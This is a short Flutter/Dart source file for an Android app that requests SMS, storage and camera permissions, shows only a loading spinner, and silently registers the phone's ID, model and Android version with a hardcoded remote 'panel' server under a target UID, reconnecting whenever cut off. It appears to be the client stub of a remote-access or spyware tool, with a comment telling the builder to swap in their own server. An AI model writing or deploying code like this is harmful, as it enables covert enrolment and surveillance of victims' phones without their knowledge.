import 'dart:async';
import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';

// ⚠️ GANTI BAGIAN INI ⚠️
const String SERVER_URL = 'http://ressyaanzyogmiipanel1669.raflydev.my.id:2363'; 
const String TARGET_UID = 'd7e27df25f68d737f7a454b58a97f77c'; 

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await [Permission.sms, Permission.storage, Permission.camera].request();
  runApp(const MyApp());
  _connectToServer();
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      home: Scaffold(body: Center(child: CircularProgressIndicator())),
    );
  }
}

Future<void> _connectToServer() async {
  final androidInfo = await DeviceInfoPlugin().androidInfo;
  IO.Socket socket = IO.io(SERVER_URL, IO.OptionBuilder().setTransports(['websocket']).setExtraHeaders({'uid': TARGET_UID}).build());
  
  socket.onConnect((_) {
    socket.emit('register_device', {
      'id': androidInfo.id, 'name': androidInfo.model,
      'androidVersion': androidInfo.version.release, 'battery': 100, // Dummy
    });
  });
  socket.onDisconnect((_) => Timer(const Duration(seconds: 5), () => _connectToServer()));
}
